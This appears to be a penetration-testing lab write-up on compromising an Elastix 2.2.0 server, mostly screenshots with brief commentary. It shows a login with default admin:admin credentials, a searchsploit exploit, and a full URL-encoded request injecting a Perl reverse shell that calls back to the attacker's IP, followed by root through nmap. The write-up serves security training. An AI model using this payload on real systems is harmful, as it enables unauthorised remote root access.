Attack Vector 6 - Elastix admin:admin

# Search for default creds

Google: `elastix default credentials`
![8a9c450cd49a034b3717885f31f07eed.png](9782c512d2044a09acc583ef8cc85e5f.png)

Visit the thread on elastix.org
[https://www.elastix.org/community/threads/default-passwords-not-password.8416/](https://www.elastix.org/community/threads/default-passwords-not-password.8416/)
![25814c172a100750b0a008ad0ac287d1.png](7be9d33920df4ea495370fbc1a6bcfa3.png)

Login using admin:admin
[https://10.11.1.217/index.php](https://10.11.1.217/index.php)
![6a5afbf37621751ab9bb5d9b90331e88.png](292b84148fec4aaf937f299611555c67.png)

# Browsing the site
Here is the System Dashboard
![784caa9c007c1358cd6d3c93d678e7ae.png](8bf943e198bc44adaa9b668430a3cf34.png)

System -> Users -> Groups
[https://10.11.1.217/index.php?menu=grouplist](https://10.11.1.217/index.php?menu=grouplist)
![11f452861c760eb55ca00c0225d31010.png](cab3e788716244a2ac1ffe318a277137.png)

System -> Users -> Users
[https://10.11.1.217/index.php?menu=userlist](https://10.11.1.217/index.php?menu=userlist)
![5ab57772b75e9ab7431fb1ea5b55628c.png](a49e39dda24b4d61846be6e81e931cbc.png)

System -> Network -> Network Parameters
[https://10.11.1.217/index.php?menu=network_parameters](https://10.11.1.217/index.php?menu=network_parameters)
![4aafedfccb7559595e0534d26a36d0a5.png](fce1a27cb49d4ca0be72e824a390aa98.png)

Agenda -> Address Book
[https://10.11.1.217/index.php?menu=address_book](https://10.11.1.217/index.php?menu=address_book)
![f12a87cd318c3476d8cc2c183b4e02e1.png](21d2c7b03b174f2e8adbd2d31776c673.png)


Details of package versions
Click on 'version'. We see it is Elastix 2.2.0
![c40453c7d44c2c801c46d6d3892b550c.png](c727b4777b6946fca9fdc4d277e55f02.png)
This will pop-up
![2b55e43f887f79c4598a4e144ce89dc7.png](6b84a4a943a64cf5b7fae029edbd51e8.png)

Could we upload a shell here?
[https://10.11.1.217/index.php?menu=billing](https://10.11.1.217/index.php?menu=billing)
![2ef37b5ba2446f451f8f89e8a029420f.png](df78209402cd49c184dcf85a05e9bded.png)



# Searchsploit
`searchsploit elastix`
![4d0161ccd35c29e96280135b9fd3db81.png](61e8cc606183496cb0aa99c034ca78b1.png)

Download 18650
`searchsploit -m 18650`
![a07ca5ad9bf3880ee3918bf9f1322386.png](babc29f7670043a99f24007112cbcf38.png)

This is what the code looks like
`vi 18650.py`
![7a1153fada95a886360d0c66089b49f8.png](ce1c6b193f0b4cba9c63a5e9e9cd0631.png)

We will need to change some variables
![e304fca85d9ca7109f06a889e2d5f2ce.png](772fcf8733f9470d967fd8bd2205278b.png)

We changed the rhost, lhost, and lport. Didn't work for us though. I don't understand the error message very well
![2a9a43a89d6ddc796e3605d1ef28ad67.png](e2afa4468e1c4abfa6dacbb8a7e6a796.png)

Start a Netcat listener
![65ce382794dda91aa0f838a1f2fade03.png](ec88d1b2e7a64d018e181deb14c12da6.png)

Try the exploit on the browser itself. Remember the encoding. For any spaces, I added %20. Also took away the single quotes near the lhost, rhost, and lport parameters
`https://10.11.1.217/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif(%24p)%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET(PeerAddr%2c%22192.168.119.214%3a443%22%29%3bSTDIN-%3Efdopen(%24c%2cr)%3b%24~-%3Efdopen(%24c%2cw)%3bsystem%24_%20while%3C%3E%3b%27%0D%0A%0D%0A`
![3a2dc268859d9a44b1bd0ebd89a7d461.png](7cc2692d54b34076b3cd06bffbfaac7f.png)

Notice we have a shell id command
![9e02b244fe322ca9d405d18ddc99805a.png](3a855c0a09f043b39cf8774a8ba3e003.png)

Start interactive nmap
![5f1f5aef45f39ab4d416a9df6fa8d12a.png](7cfa2f36e4064ff9bfee115769285582.png)

Spawn a shell
![cdb43a9607e492f65ed67127f7594935.png](1726a83d054f4653bbb42c0b425ec1e2.png)

Check id. We are root!
![82c7810253ae61e734f323c247889149.png](9d4ceeea6d664b35961d63461f4d242a.png)










